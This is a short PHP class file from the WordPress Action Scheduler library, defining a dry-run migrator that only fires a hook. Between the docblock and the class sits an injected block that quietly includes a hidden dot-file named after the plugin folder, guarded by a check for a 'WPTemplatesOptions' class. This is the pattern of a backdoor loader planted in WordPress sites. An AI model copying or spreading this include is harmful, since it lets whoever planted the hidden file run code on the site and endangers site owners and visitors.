<?php


namespace Action_Scheduler\Migration;

/**
 * Class DryRun_ActionMigrator
 *
 * @package Action_Scheduler\Migration
 *
 * @since 3.0.0
 *
 * @codeCoverageIgnore
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class DryRun_ActionMigrator extends ActionMigrator {
	/**
	 * Simulate migrating an action.
	 *
	 * @param int $source_action_id Action ID.
	 *
	 * @return int
	 */
	public function migrate( $source_action_id ) {
		do_action( 'action_scheduler/migrate_action_dry_run', $source_action_id );

		return 0;
	}
}
